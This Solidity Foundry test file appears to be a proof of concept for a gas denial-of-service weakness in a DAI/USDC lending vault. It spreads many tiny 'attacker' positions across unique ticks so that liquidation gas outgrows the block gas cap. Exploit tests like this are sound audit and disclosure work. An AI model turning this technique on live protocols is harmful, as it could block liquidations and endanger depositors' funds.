// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import "../dex/poolT1/vaults.t.sol";

interface IRawStorageReader {
    function readFromStorage(bytes32 slot_) external view returns (uint256);
}

contract AbsorbGasDosTest is VaultsBaseTest {
    uint256 internal constant POSITION_DATA_SLOT = 3;
    uint256 internal constant COLLATERAL_PER_POSITION = 1e18; // 1 DAI
    uint256 internal constant INITIAL_DEBT_AMOUNT = 10_000; // 0.01 USDC, protocol minimum
    uint256 internal constant DEBT_GROWTH_NUMERATOR = 10020; // +0.20%, above one 0.15% vault tick
    uint256 internal constant DEBT_GROWTH_DENOMINATOR = 10000;
    uint256 internal constant ATTACK_ORACLE_PRICE = 1e9;
    uint256 internal constant HEALTHY_ORACLE_PRICE = 1e15;

    bytes4 internal constant SIMULATE_LIQUIDATE_SELECTOR = bytes4(keccak256("simulateLiquidate(uint256,bool)"));
    bytes4 internal constant LIQUIDATE_RESULT_SELECTOR = bytes4(keccak256("FluidLiquidateResult(uint256,uint256)"));

    struct GasResult {
        uint256 gasUsed;
        bool absorbCompleted;
        uint256 returnDataLength;
        bytes4 returnSelector;
    }

    function test_absorbGasScalesWithUniqueTicks() public {
        // T1 uses direct Liquidity supply/borrow, avoiding Smart Debt's DEX mint floor.
        // Each position starts with 1 DAI collateral and the protocol's 0.01 USDC minimum debt.
        deal(DAI_USDC_VAULT.dex.token0, alice, 1e30);
        deal(DAI_USDC_VAULT.dex.token1, alice, 1e30);

        uint256 blockGasCap_ = vm.envOr("PLASMA_BLOCK_GAS_LIMIT", uint256(30_000_000));
        uint256 wideGasCap_ = blockGasCap_ * 8;
        if (wideGasCap_ < 300_000_000) wideGasCap_ = 300_000_000;

        uint256[6] memory checkpoints_ = [
            uint256(64),
            uint256(128),
            uint256(256),
            uint256(512),
            uint256(1024),
            uint256(2048)
        ];

        uint256 debtAmount_ = INITIAL_DEBT_AMOUNT;
        uint256 totalDebtAmount_;
        uint256 checkpointIndex_;
        uint256 previousWideGas_;
        int256 previousTick_ = type(int256).min;

        for (uint256 i = 1; i <= checkpoints_[checkpoints_.length - 1]; ++i) {
            vm.prank(alice);
            (uint256 nftId_, , ) = DAI_USDC_VAULT.vaultT1.operate(
                0,
                int256(COLLATERAL_PER_POSITION),
                int256(debtAmount_),
                alice
            );

            int256 tick_ = _positionTick(nftId_);
            assertTrue(tick_ > previousTick_, "each attacker position must occupy a new higher tick");
            previousTick_ = tick_;
            totalDebtAmount_ += debtAmount_;

            if (i == checkpoints_[checkpointIndex_]) {
                _setOraclePrice(DAI_USDC_VAULT, VaultType.VaultT1, ATTACK_ORACLE_PRICE);

                GasResult memory wide_ = _measureAbsorb(wideGasCap_);
                GasResult memory blockCapped_ = _measureAbsorb(blockGasCap_);

                assertTrue(wide_.absorbCompleted, "absorb did not complete even with the wide diagnostic gas cap");
                if (previousWideGas_ != 0) {
                    assertTrue(wide_.gasUsed > previousWideGas_, "absorb gas must grow with unique toxic ticks");
                }
                previousWideGas_ = wide_.gasUsed;

                emit log_named_uint("positions / unique ticks", i);
                emit log_named_int("last unique tick", tick_);
                emit log_named_uint("attacker collateral deposited (DAI raw)", i * COLLATERAL_PER_POSITION);
                emit log_named_uint("attacker aggregate borrowed USDC raw", totalDebtAmount_);
                emit log_named_uint("wide-cap absorb gas used", wide_.gasUsed);
                emit log_named_uint("chain block gas cap", blockGasCap_);
                emit log_named_uint("block-capped absorb completed", blockCapped_.absorbCompleted ? 1 : 0);
                emit log_named_uint("block-capped call gas used", blockCapped_.gasUsed);
                emit log_named_uint("block-capped return-data bytes", blockCapped_.returnDataLength);
                emit log_named_bytes32("block-capped return selector", bytes32(blockCapped_.returnSelector));

                _setOraclePrice(DAI_USDC_VAULT, VaultType.VaultT1, HEALTHY_ORACLE_PRICE);
                ++checkpointIndex_;
            }

            debtAmount_ = (debtAmount_ * DEBT_GROWTH_NUMERATOR) / DEBT_GROWTH_DENOMINATOR;
        }

        assertEq(checkpointIndex_, checkpoints_.length, "all checkpoints must execute");
    }

    function _measureAbsorb(uint256 gasCap_) internal returns (GasResult memory result_) {
        uint256 snapshot_ = vm.snapshot();
        bytes memory payload_ = abi.encodeWithSelector(SIMULATE_LIQUIDATE_SELECTOR, uint256(0), true);

        bytes memory returnData_;
        uint256 gasBefore_ = gasleft();
        (, returnData_) = address(DAI_USDC_VAULT.vaultT1).call{ gas: gasCap_ }(payload_);
        result_.gasUsed = gasBefore_ - gasleft();
        result_.returnDataLength = returnData_.length;

        if (returnData_.length >= 4) {
            bytes4 selector_;
            assembly {
                selector_ := mload(add(returnData_, 0x20))
            }
            result_.returnSelector = selector_;
            result_.absorbCompleted = selector_ == LIQUIDATE_RESULT_SELECTOR;
        }

        assertTrue(vm.revertTo(snapshot_), "snapshot restore failed");
    }

    function _positionTick(uint256 nftId_) internal view returns (int256 tick_) {
        bytes32 slot_ = keccak256(abi.encode(nftId_, POSITION_DATA_SLOT));
        uint256 raw_ = IRawStorageReader(address(DAI_USDC_VAULT.vaultT1)).readFromStorage(slot_);

        assertEq(raw_ & 1, 0, "position unexpectedly has no debt");

        uint256 absoluteTick_ = (raw_ >> 2) & 0x7ffff;
        tick_ = (raw_ & 2) == 2 ? int256(absoluteTick_) : -int256(absoluteTick_);
    }
}
